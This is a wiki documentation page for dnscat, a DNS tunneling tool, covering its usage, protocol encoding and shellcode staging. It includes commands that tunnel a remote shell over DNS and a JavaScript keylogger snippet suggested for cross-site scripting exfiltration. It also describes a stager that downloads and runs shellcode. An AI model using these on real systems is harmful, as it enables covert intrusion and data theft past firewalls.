---
title: 'Wiki: Dnscat'
author: ron
layout: wiki
permalink: "/wiki/Dnscat"
date: '2024-08-04T15:51:38-04:00'
redirect_from:
- "/wiki/index.php/Dnscat"
---

## dnscat is deprecated! You should try [dnscat2](https://github.com/iagox86/dnscat2) instead!

dnscat is written and maintained by me, Ron Bowes. Feel free to contact me about any issues you\'re having:

-   ron -at- skullsecurity.net
-   <https://twitter.com/iagox86>

## Intro

dnscat is designed in the spirit of netcat, allowing two hosts over the Internet to talk to each other. The major difference between dnscat and netcat, however, is that dnscat routes all traffic through the local (or a chosen) DNS server. This has several major advantages:

-   Bypasses pretty much all network firewalls
-   Bypasses many local firewalls
-   Doesn\'t pass through the typical gateway/proxy and therefore is stealthy

There are a lot of advantages to using the DNS protocol. There are, of course, several disadvantages as well:

-   Data has to be encoded into alpha-numeric (DNS allows letters (not case sensitive) and numbers), which doubles the size (we don\'t do any kind of compression yet)
-   DNS is slow \-- it\'s not a direct connection
-   The possibility of annoying DNS providers with the amount of traffic being sent through them
-   dnscat requires the listener to be an authoritative DNS server, which costs money

The last point is very important. To actually receive DNS traffic, you require either:

1.  An authoritative nameserver, preferably one that isn\'t being used for anything else. This is what I\'ll be assuming for the rest of the documentation (see the next section for far more information); or
2.  The ability to connect directly to the dnscat server on udp/53 from the client (use the \--dns flag to set the address) \-- this is far less interesting, but will be faster if it works

One of the key netcat-like components of dnscat is the -e (or \--exec) argument, which runs a program (such as /bin/sh or cmd.exe) and redirects its input and output through the connection. The \--exec flag can be used on the client or server.

dnscat has been tested on, in alphabetical order:

-   Debian 5.0.5
-   Debian 5.0.0-64
-   Fedora Core 13
-   FreeBSD 7.2
-   FreeBSD 8.0
-   FreeBSD 8.0 amd4
-   Mac OS X 10.4 (I think)
-   OpenBSD 4.6-64
-   RHEL 3-64
-   RHEL 4-64
-   RHEL 5-64
-   Slackware 13
-   Slackware 13-64
-   SLES10 SP1-64
-   Ubuntu 10.4-64
-   Windows 2000
-   Windows 2003
-   Windows XP

It should work on any modern version of Linux, FreeBSD, or Windows.

So far, it does *not* work on:

-   Solaris 10
-   HPUX
-   AIX

If anybody is willing to troubleshoot why, please let me know. It may be simple, or it may be complicated.

### Recursive DNS {#recursive_dns}

To understand the magic of dnscat, it is important to understand the recursive nature of DNS. For a better (and probably more correct) explanation of DNS, I recommend Wikipedia: <http://en.wikipedia.org/wiki/Domain_Name_System> \-- I\'ll be discussing recursive DNS as it pertains to dnscat only.

DNS is, by its very nature, recursive. Unless your server has already looked it up, it has no idea where www.google.ca is. How would it? Google\'s in charge of knowing where its own servers are. That being said, your server obviously has the ability to \*find\* Google. How\'s it do that?

The first step to looking up a domain name is to to send a request to your local nameserver, say 192.168.1.1. If it doesn\'t know the answer, it directs the question to its nameserver and so on, until the root nameservers are reached. Those servers know where to find the proper address for www.google.ca, and will direct the request to the nameserver set up for \'google.ca\', which is ns1.google.ca (among others). ns1.google.ca receives the request, and responds with the proper address, which makes its way back to the original machine.

The most important thing to note are:

1.  The request was originally sent to 192.168.1.1, a local address that has to be allowed by the firewalls (otherwise, nothing would work)
2.  The request ended up at ns1.google.ca, a server controlled by Google
3.  Google\'s responses made it back to the original requester, via 192.168.1.1

Google was allowed to do this because they are the authority for google.ca.

dnscat, at its core, is as simple as that; it runs on a server that is the authority for a DNS name, and all traffic is routed to it through the local DNS server.

If you aren\'t sure whether or not you have the authoritative record, checking is easy. I\'ve included a program called [dnstest](dnstest "wikilink") that checks if you are the authority for a domain by sending a random request and checking if it comes back. If you plan to run a dnscat listener on a system, it\'s a good idea to run dnstest. You can also run dnscat \--test, which simply runs dnstest.

By default, you probably won\'t be the authoritative nameserver for anything. To become one, you need to register a domain, and point its records at yourself. You probably won\'t be able to use that domain for anything else.

As an alternative to recursive DNS, dnscat can operate in pure client/server mode using the \--dns argument. When using \--dns, an authoritative server isn\'t required the majority of dnscat\'s advantages are lost. It now requires UDP port 53 to be open from the client to the server.

## Downloads

(Note: due to the beta state of dnscat, the protocol somewhat varies between versions; make sure you match up your client and server!)

This can also be accessed through the [nbtool](nbtool "wikilink") page.

-   Trunk
    -   svn co <http://svn.skullsecurity.org:81/ron/security/nbtool>
-   nbtool 0.05alpha2 (2010-07-06) (svn rev 876)
    -   Subversion: svn co <http://svn.skullsecurity.org:81/ron/security/nbtool-0.05alpha2>
    -   Source: <http://www.skullsecurity.org/downloads/nbtool-0.05alpha2.tgz>
    -   Windows (32-bit): <http://www.skullsecurity.org/downloads/nbtool-0.05alpha2-win32.zip>
    -   Linux (32-bit Slackware): <http://www.skullsecurity.org/downloads/nbtool-0.05alpha2-bin.tgz>
    -   Linux (64-bit Slackware): <http://www.skullsecurity.org/downloads/nbtool-0.05alpha2-bin64.tgz>
    -   Changelog: <http://svn.skullsecurity.org:81/ron/security/nbtool-0.05alpha2/CHANGELOG>
-   nbtool 0.05alpha1 (2010-07-06) (svn rev 870)
    -   Subversion: svn co <http://svn.skullsecurity.org:81/ron/security/nbtool-0.05alpha1>
-   nbtool 0.04 (2010-02-20) (svn rev 677)
    -   Subversion: svn co <http://svn.skullsecurity.org:81/ron/security/nbtool-0.04>
    -   Source: <http://www.skullsecurity.org/downloads/nbtool-0.04.tgz>
    -   Windows (32-bit): <http://www.skullsecurity.org/downloads/nbtool-0.04-win32.zip>
    -   Linux (32-bit Slackware): <http://www.skullsecurity.org/downloads/nbtool-0.04-bin.tgz>
    -   Linux (64-bit Slackware): <http://www.skullsecurity.org/downloads/nbtool-0.04-bin64.tgz>
    -   Changelog: Everything changed \-- total rewrite, new tools, etc. Building this tool should be pretty straightforward.

## Building

On Linux/BSD, simply extract the source and run \'make\'/\'make install\':

    $ tar -xvvzf dnscat-x.xx.tar.gz
    $ cd dnscat-x.xx
    $ make
    # make install

Better yet, check out the SVN version and compile/install that (note that this may not always work, since I\'m the only developer I occasionally leave it in a broken state):

    $ svn co http://svn.skullsecurity.org:81/ron/security/nbtool nbtool-svn
    $ cd nbtool-svn
    $ make
    # make install

If you have any compile errors/warnings, please let me know. I\'ve done my best to comply with coding standards, so it should compile everywhere. But that doesn\'t mean it WILL compile anywhere, far from it. My contact info is at the top of this page.

### Windows

If you want to build from source on Windows, extract the source, navigate into the mswin32 directory, open the .sln file in Visual Studio (I used 2008), and build it.

## How-to {#how_to}

If you\'re going to read one section, this is probably the best one. It\'ll answer the question, \"what the heck do I do with dnscat?\"

### Starting a server {#starting_a_server}

You can start a dnscat server that supports a single client by running:

    dnscat --listen

Adding \--multi enables a dnscat server to handle multiple simultaneous clients:

    dnscat --listen --multi

While \--multi is obviously more functional, it is also slightly more difficult to use and doesn\'t take as kindly to redirection (it takes a little bit of shell magic to make it useful; I don\'t recommend it). Every client that connects picks a unique session id, which is displayed before every message. To send messages to specific sessions, the outgoing messages also have to be prefixed with the session id. So, sessions look like this (the \'(in)\' and \'(out)\' are added for clarification):

    (in)  session1: This is some incoming data for the first session
    (out) session2: This is outgoing data on second session
    (in)  session2: This is a response on the second connection

And so on. When \--multi isn\'t being used, redirection can be used to read/write files, create relays, and so on, the same way netcat can.

### Starting a client {#starting_a_client}

Once a server is running, a client can connect to it. This can be done in one of two ways.

First, and the usage I recommend: if the server is an authority for a domain name, you can use the \--domain argument to provide the domain. Requests will be sent to the local dns server and will eventually be routed, through the DNS hierarchy, to the server. This is the best way to use dnscat, because it is very unlikely to be prevented. For more information, see the outline of Recursive Dns, above.

The second method is to send the dns messages directly from the client to the server using the \--dns argument to specify the dnscat server address. This is useful for testing, and can fool simple packet captures and poorly conceived firewall rules, but isn\'t an ideal usage of dnscat.

By default, a random session id will be generated. If you run the dnscat server in \--multi mode, you will likely want to use the \--session argument on the client to give the sessions a more friendly name. No two sessions can share an id, though, and all names must be dns-friendly characters (letters and numbers).

To summarize, here are the two options for starting a client.

    dnscat --domain skullseclabs.org
    or
    dnscat --dns 1.2.3.4

Where \'skullseclabs.org\' is the domain that the dnscat server is the authority for, or \'1.2.3.4\' is the ip address of the dnscat server.

## Examples

### Simple server {#simple_server}

As discussed above, a dnscat server can be started using the \--listen argument:

    dnscat --listen

Or, if multiple clients will connect, \--multi can be given:

    dnscat --listen --multi

### Simple client {#simple_client}

To start a dnscat client with an authoritative domain, use the following command:

    dnscat --domain &lt;domain&gt;

For example:

    dnscat --domain skullseclabs.org

And to start it without an authoritative domain, use this:

    dnscat --dns &lt;dnscat_server_address&gt;

For example:

    dnscat --domain 1.2.4.4

For more options, use \--help:

    dnscat --help

### Remote shell {#remote_shell}

Typically, to tunnel a shell over DNS, you\'re going to want to run a standard server as before:

    dnscat --listen

And run the shell on the client side:

Linux/BSD:

    dnscat --domain skullseclabs.org --exec "/bin/sh"

Windows:

    dnscat.exe --domain skullseclabs.org --exec "cmd.exe"

On the server, you can now type commands and they\'ll run on the client side.

### Transfer a file {#transfer_a_file}

You can transfer a file to the client from the server like this:

    Server:
    dnscat --listen > file.out

    Client:
    dnscat --domain <domain> < file.in

You can change the direction that the file goes by switching around the redirects. To transfer from the server to the client, do this:

    Server:
    dnscat --listen < file.in

    Client:
    dnscat --domain <domain> > file.out

A couple things to note:

-   No integrity checking is performed
-   There is currently no indication when a transfer is finished

### Tunnel another connection {#tunnel_another_connection}

This is my favourite thing to do, and it works really slick. You can use netcat to open a port-to-port tunnel through dnscat. I like this enough that I\'m going to add netcat-like arguments in the next version.

Let\'s say that the client can connect to an ssh server on 192.168.2.100. The server is on an entirely different network and normally has no access to 192.168.2.100. The whole situation is a little confusing because we want the dnscat client to connect to the ssh server (presumably, in real life, we\'d be able to get a dnscat client on a target network, but not a dnscat server). \"client\" and \"server\" are such ancient terms anyways. I prefer to look at them as the sender and the receiver.

A diagram might help:

    ssh client
         |
         | (port 1234 via netcat)
         |
         v
    dnscat server
         ^
         |
         | (DNS server(s))
         |
    dnscat client
         |
         | (port 22 via netcat)
         |
         v
    ssh server

It\'s like a good ol\' fashioned double netcat relay. Ed Skoudis would be proud. :)

First, we start the netcat server. The server is going to run netcat, which listens on port 1234:

    dnscat --listen --exec "nc -l -p 1234"

If you connect to that host on port 1234, all data will be forwarded across DNS to the dnscat client.

Second, on the client side, dnscat connects to 192.168.2.100 port 22:

    dnscat --domain skullseclabs.org --exec "nc 192.168.2.100 22"

This connects to 192.168.2.100 on port 22. The input/output will both be sent across DNS back to the dnscat server, which will then send the traffic to whomever is connected on TCP/1234.

Third and finally, we ssh to our socket:

    ssh -p 1234 ron@127.0.0.1

Alternatively, if available you can also use the ssh -o ProxyCommand option which avoids the need for nc on the client:

    ssh -o ProxyCommand="./dnscat --domain skullseclabs.org" root@localhost

One thing to note: at the moment, doing this is slooooow. But it works, and it\'s really, really cool!

### Web keylogger {#web_keylogger}

There is an implementation of dnscat in Javascript (jsdnscat) written by Stefan Penner. It\'s located in the \'samples\' folder of nbtool and conists of two libraries, one for keylogging and the other for dnscat. There are several example HTML files for using these, but it really comes down to these lines:

    <script type='text/javascript' src='js/skullsecurity.all.min.js'></script>
    <script type='text/javascript'>
      SkullSecurity.jsdnscat.config.host = 'yourdomain.com';
      SkullSecurity.keylogger.start(SkullSecurity.jsdnscat.send);
    </script>

Equivalent code can easily be put into a .js file and hosted on your server for easy use with cross-site scripting.

The best reason for using this as opposed to traditional avenues for data exfiltration is to get around logging and firewalls \-- because dnscat will respond with a localhost record to all A and AAAA requests, the computer doesn\'t actually send an HTTP request to the network, yet you still get its data.

## FAQ

-   Q: Is it legal to route traffic through DNS?
-   A: I have no idea. Don\'t abuse servers you don\'t own, though.

-   Q: Why did you write this?
-   A: To prove it could be done.

-   Q: Can I implement my own client?
-   A: Yes, please do! I\'d like to get samples in any language I can. And tell me about it so I can include it (with your permission).

-   Q: Can I write my own server?
-   A: Sure, but if there are any features missing that you want, let me know and maybe I\'ll add it to my version.

-   Q: Did anybody actually ask these questions, ever?
-   A: No. At least, not on purpose.

## Protocol

If you\'re simply interested in running dnscat and don\'t care how it works under the covers, you can probably skip this section entirely. If, however, you\'re planning on writing your own client (or server), this is the place to be.

Please note that, due to the current maturity level of the protocol, changes may happen between versions. Version 0.4 to 0.5 changes several things, in fact. If you implement anything, please let me know!

I can\'t really think of any cases where you\'d want to write your own server, since my server runs on pretty much any platform (and I wrote a second server in Ruby, linked to the Metasploit Framework project), so I\'m going to focus somewhat more on the client side. Feel free to email me telling me why I\'m wrong and why you\'re planning on writing your own server. Spite is a fine reason.

Before we start looking at the protocol itself, it\'s worth taking a peek at how the data is encoded. Then we\'ll get into the different types of messages (datagram vs. stream) and the various fields.

### Encoding

DNS only allows letters (not necessarily case sensitive), numbers, and certain limited symbols. Base64-encoding nearly works, but Base64 depends on using upper/lowercase, so it didn\'t work out. I ended up settling on NetBIOS-style encoding, which translates everything to uppercase letters. Later, I realized that some languages (like SQL) would have a far easier time with hex encoding, so I added it as an optional encoding type. Details on each type follow.

In any connection, the client chooses their own encoding and adds it as a flag. The server is required to respond with the same encoding the client used.

Encodings should not be case sensitive and decoders should make no assumptions about case. I\'ve seen at least one dns server that normalized the case before sending, which would break all kinds of stuff.

#### NetBIOS

In short, to use NetBIOS encoding, take each byte of data, split it into its pair of nibbles, add each nibble to \'A\' (0x41 or 65), and add it to the name as the two bytes (one byte per nibble).

For example, take the letter \'b\':

-   \'b\' is 0x62 in hex.
-   0x6 and 0x2 are its two nibbles.
    -   0x6 + 0x41 = 0x47 (\'G\')
    -   0x2 + 0x41 = 0x43 (\'C\')
-   Therefore, \'b\' =\> \"GC\".

As another example, take the byte 0xC3:

-   0xC and 0x3 are its two nibbles.
    -   0xC + 0x41 = 0x4D (\'M\')
    -   0x3 + 0x41 = 0x44 (\'D\')
-   Therefore, 0xC3 =\> \"MD\".

And the string \"abcdef\":

-   \'a\' =\> 0x61 =\> (0x6 + 0x41), (0x1 + 0x41) =\> 0x47, 0x42 =\> \"GB\"
-   \'b\' =\> 0x62 =\> (0x6 + 0x41), (0x2 + 0x41) =\> 0x47, 0x43 =\> \"GC\"
-   \'c\' =\> 0x63 =\> (0x6 + 0x41), (0x3 + 0x41) =\> 0x47, 0x44 =\> \"GD\"
-   \'d\' =\> 0x64 =\> (0x6 + 0x41), (0x4 + 0x41) =\> 0x47, 0x45 =\> \"GE\"
-   \'e\' =\> 0x65 =\> (0x6 + 0x41), (0x5 + 0x41) =\> 0x47, 0x46 =\> \"GF\"
-   \'f\' =\> 0x66 =\> (0x6 + 0x41), (0x6 + 0x41) =\> 0x47, 0x47 =\> \"GG\"
-   =\> \"GBGCGDGEGFGG\"

As you can see, every character will be in the range of \'A\' to \'O\'. These characters are converted into a string that\'ll end up being exactly twice as long as the original.

To decode, you simply do the same thing in reverse. Be sure to convert the characters to uppercase first, though, to ensure that the case hadn\'t been changed somewhere along the line.

The advantages of NetBIOS encoding is that it\'s easy to implement, even in assembly, and, to the naked eye, doesn\'t look like anything much, just a stream of characters (people are more liable to recognize hex than to recognize NetBIOS).

#### Hex

To use hex encoding, which requires the flag 0x10 to be set (more on that later), simply encode all bytes as their equivalent in hex. So \'A\' would be encoded as \"41\", \'b\' as \"62\", etc. Like NetBIOS, this exactly doubles the length of the string.

### Structure

There are two types of dnscat packets with similar, but different, structures:

1.  Datagram
2.  Stream

These are, of course, modeled after TCP and UDP, except greatly simplified. Like TCP and UDP, they have fields, flags, etc. The difference is that we\'re encoding the requests as domain names.

The various parts of the packet, including any control flags and data being sent, are encoded into a domain name, as described below, and sent to a DNS server (typically the local one). The server encodes its response the same way and returns it as its domain name. This request/response must be done as a query type that returns a name, not an IP address. Supported types are CNAME, NS, TXT, and MX records. The server is required to respond with the same type it receives.

Alternatively, if data is only being sent client to server, using an A or AAAA record is okay. In that case, the server isn\'t able to return data to the client; only an IP address is returned. The IP address can be set to anything; localhost (127.0.0.1 or ::1) are good defaults. Optionally, a server can respond with the real address \-- mimicking an actual recursive DNS server is a good way to hide.

The main reason for using A or AAAA records is for when implementing this on a platform that normally doesn\'t make DNS requests, such as a Web browser.

The data is broken up into various fields, such as the signature and flags (see below for a list). Each of these fields is a separate sub-name in the DNS packet (field1.field2.field3.etc). Text fields are encoded as-is, numeric fields are encoded as 32-bit hex (1 - 8 hex characters), and the data fields are encoded in NetBIOS or hex, as described above.

Because of the nature of DNS, the server never actually knows who the client is, and therefore cannot initiate a data transfer. As a result, the client must poll the server for by sending zero-data packets. This must be done to properly receive data in both datagram and stream modes. Without polling, data is only sent from the server to the client when the client sends its own data (which is allowed, but not recommended).

In datagram mode, this polling is optional and is only required if the client wishes to receive data from the server in a timely fashion. In stream mode, polling is strongly recommended because the stream connection will time out if it isn\'t constantly being polled.

In send-only mode (using A/AAAA records), especially if the client isn\'t an actual dnscat implementation, polling is not necessary. The server can\'t send data or maintain a connection anyways.

#### Fields

These fields are common to both datagram and stream mode. Unless otherwise noted, each of these is one field (a part of the domain name between periods). More information on when the different fields are used is below:

-   signature - A shared signature between the client and server. \"dnscat\" is the default signature. (text)
-   flags - Zero or more of the following flags ORed together: (32-bit hex)
    -   0x00000001 Stream - Use stream mode (default: datagram).
    -   0x00000002 SYN - Client-to-server requesting connection. (removed in 0.05)
    -   0x00000004 ACK - Server-to-client accepting connection. (removed in 0.05)
    -   0x00000008 RST - Terminate the connection and send an error (client-to-server or server-to-client, for any reason).
    -   0x00000010 Hex - Use hex encoding (default: NetBIOS).
    -   0x00000020 Session - Use a session field (version 0.05 and newer)
    -   0x00000040 Identifier - Use an identifier field (version 0.05 and newer)
-   identifier - An arbitrary string that\'s passed from client to server that allows the server to identify where a particular session originated. Typically used if there\'s a requirement to link a session with a particular client.
-   session - An arbitrary string that uniquely defines the current session. Must contain letters and numbers, not case sensitive. All remaining fields will be in the context of that connection. Client chooses a random session string; server treats previously unknown strings as new connections and keeps until timeout/RST. If client doesn\'t set the session flag, server should use a blank session name (\"\"). Only supported on version 0.05 and higher, and only exists if the Session flag (0x00000020) is set.
-   error - The error code, if the RST flag is set (32-bit hex).
    -   0x00000000 Success - You shouldn\'t send or receive this.
    -   0x00000001 Busy - Sent as a response to SYN if there is already a session active.
    -   0x00000002 Invalid in state - A packet had invalid flags or was out of state (sort of a catch-all).
    -   0x00000003 Fin - Connection gracefully closed.
    -   0x00000004 Bad sequence number - This normally shouldn\'t be sent (it\'s best to ignore bad sequence numbers).
    -   0x00000005 Not implemented - used by server or client to indicate that a requested option isn\'t implemented (version 0.05 and newer, ironically).
    -   0xFFFFFFFF Testing - only sent when testing a client or server.
-   seq - The sequence number in a stream packet (32-bit hex).
-   count - The number of upcoming data sections (3 is a good max, 0 is fine for polling) (32-bit hex).
-   data - Zero or more fields of encoded data (based on count). The maximum length of this field is 63 in standard DNS implementations. Since encoding doubles the length of the string, that\'s 31 bytes before encoding for each data field.
-   garbage - One or more random characters, used to prevent caching (text).
-   domain - The domain that you\'re the authority for (most dnscat servers don\'t care, but the DNS servers along the way do) (text - 1 or more fields).

#### Datagram mode {#datagram_mode}

If you\'re implementing a client, I recommend starting with datagram. All you have to know is the following format: \<signature\>.\<flags\>.\<count\>.\<data\>.\<garbage\>.\<domain\>

Realistically, your packets will probably look like this:

    dnscat.0.1.&lt;1 data field&gt;.&lt;garbage&gt;.&lt;domain&gt;

Or, with a session:

    dnscat.20.&lt;session&gt;.1.&lt;1 data field&gt;.&lt;garbage&gt;.&lt;domain&gt;

RST packets can also be sent in datagram mode:

    dnscat.8.&lt;garbage&gt;.&lt;domain&gt;

#### Stream

I tried to model stream packets after TCP, and came up with a stripped-down protocol. That turned out to be overly complicated, so now it\'s based entirely on sequence numbers.

To start a connection, the client sends the server its first message, with or without data sessions, and a randomized sequence number. If using sessions, a randomized session id should also be used.

When the server receives this packet, it builds a new connection and replies with its queued data (if any) or no data, with the same sequence number. After that, the client increments the sequence number and the server validates that the number matches.

In the case where the client sends an invalid sequence number, the server should simply ignore it and not process it any further. Additionally, no response should be sent; in my experience, this is usually caused by retransmissions and causes more confusion than it solves.

If a client doesn\'t get a response, or gets a DNS error (\*not\* a dnscat RST), it should back off for a set amount of time (I use 30 seconds) and resend.

If a client gets a response with a dnscat RST, it should consider the connection closed and send no further traffic.

If a client wishes to terminate the connection, it should send a RST packet to the server with the error REMOTE_ERROR_FIN set. The server should respond in kind.

A SYN or ACK packet looks like this:

    &lt;signature&gt;.&lt;flags&gt;.&lt;seq&gt;.&lt;garbage&gt;.&lt;domain&gt;

An RST packet looks like this:

    &lt;signature&gt;.&lt;flags | 0x01 | 0x08&gt;.&lt;seq&gt;.&lt;error code&gt;.&lt;garbage&gt;.&lt;domain&gt;

And a data packet looks like this:

    &lt;signature&gt;.&lt;flags | 0x01&gt;.&lt;seq&gt;.&lt;count&gt;.&lt;data&gt;.&lt;garbage&gt;.&lt;domain&gt;

And any message with a session looks like this:

    &lt;signature&gt;.&lt;flags | 0x01 | 0x20&gt;&lt;session&gt;.&lt;seq&gt;.&lt;rest of the message&gt;

#### Flow diagram {#flow_diagram}

To put it in the form of a drawing, here is how you parse a dnscat request/response (datagram or stream):

                                        START
                                          |                                   #
                                          v                                   #
                                    +-----------+                             #
                                    | Signature |                             #
                                    +-----------+                             #
                                          |                                   #
                                          v                                   #
                                     +-------+                                #
                                     | Flags |--------+                       #
                                     +-------+        |                       #
                                          |           |                       #
                                          |           |                       #
                                    (identifier) (!identifier)                #
                                          |           |                       #
                                          |           |                       #
                                          v           |                       #
                                     +---------+      |                       #
                                     |identifier|     |                       #
                                     +---------+      |                       #
                                          |           |                       #
                                          +<----------+                       #
                                          |                                   #
                                          +----------                         #
                                          |         |                         #
                                          |         |                         #
                                      (session) (!session)                    #
                                          |         |                         #
                                          v         |                         #
                                     +---------+    |                         #
                                     | Session |    |                         #
                                     +---------+    |                         #
                                          |         |                         #
                                          +<--------+                         #
                                          |                                   #
                                          +----------                         #
                                          |         |                         #
                                       (stream) (!stream)                     #
                                          |         |                         #
                                          |         |                         #
                                          v         |                         #
                                       +-----+      |                         #
                                       | Seq |      |                         #
                                       +-----+      |                         #
                                          |         |                         #
                                          +<--------+                         #
                                          |                                   #
                                          +--------------+                    #
                                          |              |                    #
                                       (!RST)          (RST)                  #
                                          |              |                    #
                                          v              v                    #
                                      +-------+      +-------+                #
                          +-----------| Count |      | Error |                #
                          |           +-------+      +-------+                #
                          |               |              |                    #
                      (count=0)       (count>0)          |                    #
                          |               |              |                    #
                          |      +------->+              |                    #
                          |      |        |              |                    #
                          |  (count>0)    |              |                    #
                          |      |        v              |                    #
                          |      |     +------+          |                    #
                          |      +-----| Data |          |                    #
                          |            +------+          |                    #
                          |               |              |                    #
                          |           (count=0)          |                    #
                          |               |              |                    #
                          |               |              |                    #
                          +-------------->+<-------------+                    #
                                          |                                   #
                                          v                                   #
                                     +---------+                              #
                                     | Garbage |                              #
                                     +---------+                              #
                                          |                                   #
                                          v                                   #
                                      +--------+                              #
                                      | Domain |                              #
                                      +--------+                              #
                                          |                                   #
                                          v                                   #
                                         END                                  #

## Staging

The staging code is still somewhat in flux right now, since it is currently in development, but this will describe the likely implementation.

### What is staging? {#what_is_staging}

Staging refers to using a small piece of code to download and run a larger one. The current [staging code](http://svn.skullsecurity.org:81/ron/security/nbtool/samples/shellcode-stager-win32/dnscat-stager-win32.asm) compiles to approximately 250 bytes (depending on the domain name), unencoded, and will download the full stage through DNS.

This has the advantage of having strong, stable shellcode that can be arbitrarily large (within reason), while only requiring a small amount of code to be run directly at the time of the exploit.

### How do I use it? {#how_do_i_use_it}

When using dnscat version 0.05 or later, the \--stage argument specifies the file to stage. Once \--stage is given, requests can download the stage as normal. An example usage might be:

    dnscat --listen --stage shellcode-file.bin

The release of dnscat 0.05 will likely include a patch to Metasploit, which will automate the staging

### How does it work? {#how_does_it_work}

The following are the design constraints for the staging code:

-   The name has to be as simple as possible, since the client portion is implemented in shellcode
-   The name has to contain the maximum number of different characters, and maximum packet size, so I chose TXT records
    -   Note: While TXT records should be able to contain any character, Microsoft\'s DNS library fails if they contain a null byte (\\x00), so we don\'t allow the null byte to be present.
-   The name has to identify which chunk of code we\'re downloading
-   The response has two possibilities: \"here is the next chunk\" and \"no chunk at that location\"

For those reasons, the stager sends requests for TXT records with the following name: \<number\>.\<domain\>

Where number is the piece of the file to download, in decimal and potentially with leading zeroes, and domain is the domain that will service it. Each chunk is a predefined size (255 bytes, for example). So the following URL:

    00.skullseclabs.org

Will return bytes 0 - 254 in the TXT field. This URL:

    01.skullseclabs.org

Will return bytes 255 - 509, and so on.

When there is no data left, the server will return a DNS error, NXDOMAIN, to indicate that there is no data left to return. At that point, the client should jump to the first byte that was returned to run the payload.

## Acknowledgements

I have to give a shout-out to the following people, who made my life easier:

-   Nmap and Ncat often overcame stupid platform issues, often on Windows, that I ran into. David Fifield was a great help in helping solve weird Windows issues.
-   Benjamin Sittler wrote a great getopt replacement that I use!
-   Paul Hsieh wrote a great platform-independent stdint.h replacement that I use.
-   Tadeusz Pietraszek wrote a dnscat implementation in Java, many years ago. Although I didn\'t use any of his ideas/code, I\'m happy I\'m not the first.
-   Wireshark is an amazing tool. Period.
-   Anybody who helped me test/code.
